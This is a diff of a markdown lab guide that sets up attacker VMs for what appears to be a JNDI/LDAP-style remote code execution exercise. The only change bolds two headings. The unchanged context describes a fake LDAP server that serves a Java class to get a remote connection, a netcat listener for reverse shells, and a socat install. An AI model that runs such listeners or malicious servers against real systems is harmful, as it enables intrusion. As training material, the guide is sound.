@@ -7,7 +7,7 @@ We also have to prepare our attacker VM.
 
 Let's install an application that poses as an LDAP server and provider a Java class to the vulnerable application which will create a remote connection back to the attacker VM.
 
-Run the following commands on the attacker01 VM.
+**Run the following commands on the attacker01 VM.**
 
 ```ctr:
 sudo zypper in -y python3
@@ -43,7 +43,7 @@ And start listening for remote shells
 sudo nc -lvnp 443
 ```
 
-Run the following commands on the attacker02 VM.
+**Run the following commands on the attacker02 VM.**
 
 ```ctr:
 sudo zypper in -y socat
